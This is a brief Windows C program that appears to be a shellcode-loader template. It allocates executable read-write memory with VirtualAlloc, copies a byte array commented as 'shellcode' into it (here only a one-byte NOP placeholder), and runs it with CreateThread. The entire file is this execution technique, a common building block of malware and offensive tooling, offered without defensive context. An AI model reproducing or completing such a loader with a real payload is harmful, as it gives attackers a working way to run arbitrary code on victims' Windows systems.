#include <Windows.h>

// shellcode
unsigned char buf[] = { 0x90 };

int main() {
	LPVOID alloc_mem = VirtualAlloc(NULL, sizeof(buf), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	MoveMemory(alloc_mem, buf, sizeof(buf));

	HANDLE tHandle = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)alloc_mem, NULL, 0, NULL);
	WaitForSingleObject(tHandle, INFINITE);

	return 0;
}
